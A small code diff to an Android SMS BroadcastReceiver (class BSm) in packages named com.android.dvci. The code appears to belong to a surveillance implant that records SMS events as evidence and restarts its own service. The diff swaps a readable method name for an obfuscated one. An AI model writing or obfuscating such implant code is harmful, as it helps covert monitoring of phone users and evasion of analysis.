@@ -20,7 +20,6 @@ import android.telephony.SmsMessage;
 import com.android.dvci.Core;
 import com.android.dvci.ServiceMain;
 import com.android.dvci.auto.Cfg;
-import com.android.dvci.conf.ConfType;
 import com.android.dvci.event.EventSms;
 import com.android.dvci.evidence.Markup;
 import com.android.dvci.file.Path;
@@ -33,7 +32,7 @@ public class BSm extends BroadcastReceiver {
 	// Apparentemente la notifica di SMS inviato non viene inviata di proposito
 	@Override
 	public void onReceive(Context context, Intent intent) {
-		boolean isCoreRunning = Core.isServiceRunning();
+		boolean isCoreRunning = Core.iSR();
 		if (isCoreRunning == false) {
 			Intent serviceIntent = new Intent(context, ServiceMain.class);
 
